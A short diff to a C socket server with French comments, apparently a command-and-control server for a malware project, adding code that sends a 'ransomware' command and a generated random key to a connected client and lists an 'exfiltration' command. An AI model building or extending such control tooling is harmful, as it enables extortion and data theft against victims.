@@ -7,6 +7,8 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include "gener.h"
+#include "stock.h"
 
 #define PORT 4242  // le port du serveur
 #define BACKLOG 10 // nombre max de demandes de connexion
@@ -98,10 +100,10 @@ int main()
             {
             case 1:
                 command = "ransomware";
+                send(client_fd, command, strlen(command), 0);
                 char *random_string = gener(16);
                 send(client_fd, random_string, strlen(random_string), 0);
                 stock (random_string,buffer);
-
                 break;
             case 2:
                 command = "exfiltration";
